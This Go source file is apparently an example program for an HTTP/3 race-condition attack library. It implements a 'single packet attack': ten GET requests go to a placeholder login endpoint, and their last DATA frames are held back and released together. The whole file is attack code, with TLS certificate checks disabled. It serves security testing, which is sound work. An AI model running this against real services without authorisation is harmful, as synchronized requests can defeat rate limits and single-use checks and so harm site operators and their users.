/*
Last Frame Synchronization (also known as Single Packet Attack) on HTTP/3
for requests which do not have body with setting Content-Length method and sending fake DATA frames
1. Send HEADERS frame without setting FIN=0
2. Send DATA frames all together (last-bytes only) with setting FIN=1
*/

package main

import (
	"context"
	"crypto/tls"
	"fmt"
	"github.com/nxenon/h3spacex"
	"github.com/nxenon/h3spacex/http3"
	"io"
	"net/http"
	"os"
	"time"
)

func main() {

	tlsConf := &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{http3.NextProtoH3},
	}

	quicConf := &quic.Config{
		MaxIdleTimeout:  10 * time.Second,
		KeepAlivePeriod: 10 * time.Millisecond,
	}
	try_num := 10
	var allRequests []*http.Request

	headers := map[string]string{}

	reqFakeBody := "aa" // 2 bytes fake body! it sets Content-Length: 2 header. You should use 2 bytes at least!

	for i := 0; i < try_num; i++ {
		// it is important to use this **GetRequestObjectGetWithBody** method!
		// using this method GetRequestObject does not work! because it does not add Content-Length header when the request method is GET
		req, err2 := http3.GetRequestObjectGetWithBody("https://domain.com/login", "GET", headers, []byte(reqFakeBody))

		if err2 != nil {
			fmt.Println("Error creating request: ", err2)
			continue
		}
		allRequests = append(allRequests, &req)
	}

	dialAddress := "IP:UDP_PORT"

	ctx := context.Background()
	quicConn, err := quic.DialAddr(ctx, dialAddress, tlsConf, quicConf)
	if err != nil {
		fmt.Printf("Error Connecting to %s. Erorr: %s", dialAddress, err)
		os.Exit(1)
	}

	allResponses := http3.SendRequestsWithLastFrameSynchronizationMethod(quicConn,
		allRequests,
		1,
		150,
		true,
	)

	for req, res := range allResponses {
		fmt.Printf("for request to %s\n", req.URL)
		fmt.Println("+---Headers---+")
		fmt.Printf("Status Code: %d\n", res.StatusCode)
		for key, value := range res.Header {
			fmt.Printf("%s: %s\n", key, value[0])
		}
		fmt.Println("+---Body---+")
		body, err3 := io.ReadAll(res.Body)
		if err3 != nil {
			fmt.Println("Error reading response body:", err3)
			continue
		}
		fmt.Println(string(body))

	}
}
